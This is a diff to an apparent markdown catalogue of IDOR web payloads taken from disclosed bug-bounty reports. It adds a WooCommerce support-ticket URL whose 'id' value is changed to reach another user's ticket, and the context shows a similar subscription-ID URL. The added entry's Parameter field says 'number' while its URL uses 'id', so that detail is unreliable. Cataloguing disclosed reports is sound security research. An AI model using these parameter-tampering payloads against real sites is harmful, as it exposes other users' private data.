@@ -1,6 +1,6 @@
 # Insecure Direct Object Reference
 
-24 payloads from disclosed reports.
+25 payloads from disclosed reports.
 
 ## Insecure Direct Object Reference by manipulating the 'id' query parameter to access a specific DM
 
@@ -288,6 +288,18 @@ https://target.com/gold/payment-success?subscription_id=████████
 
 **Parameter:** `subscription_id`
 — [\[target.com\] IDOR - Gold Subscription Details, Able to view "Membership ID" and "Validity Details" of other Users](https://hackerone.com/reports/344145) · Eternal · [riya](https://hackerone.com/riya) · $100.0
+
+
+## IDOR by modifying the ticket ID parameter to access another user's ticket.
+
+### `2ded062c`
+
+```
+https://target.com/my-account/tickets/?id=340529
+```
+
+**Parameter:** `number`
+— [WooCommerce: Support Ticket indirect object reference](https://hackerone.com/reports/91599) · Automattic · [paresh_parmar](https://hackerone.com/paresh_parmar)
 
 
 ## IDOR by modifying 'user_id' parameter to access other users' videos
